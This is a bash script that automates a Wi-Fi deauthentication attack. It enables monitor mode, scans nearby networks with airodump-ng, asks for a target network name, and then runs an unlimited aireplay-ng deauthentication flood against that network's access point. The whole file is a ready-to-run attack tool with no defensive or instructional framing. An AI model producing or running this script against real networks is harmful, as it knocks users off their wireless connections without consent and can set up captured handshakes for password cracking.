#!/bin/bash
echo -e "\n [OK] cleaning ... \n "

clear
rm *.csv

trap ctrl_c INT
function ctrl_c() {
        airmon-ng stop wlp9s0mon
        rm -f *.csv
        echo -e "\n [OK] cleaning ... \n "
}


echo -e "\n [+] starting configuration ...\n"
echo -e "\n [+] Enabling mode Monitor ...\n"
airmon-ng start wlp9s0
echo -e "\n [+] Chose a target \n"

read -p" press enter to continue ..."

xterm -e "airodump-ng wlp9s0mon -w out --output-format csv"
cat out-01.csv | sed 's/,/ ,/g' | column -t -s, | less -S

read -p " enter the name of the NETWORK :D : " NETWORK


echo -e "\n [+] starting configuration ...\n"
iw dev wlp9s0mon set channel $(cat out-01.csv | grep $NETWORK | cut -d',' -f 4)
aireplay-ng -0 0 -a $(cat out-01.csv | grep $NETWORK | cut -d',' -f 1)  wlp9s0mon



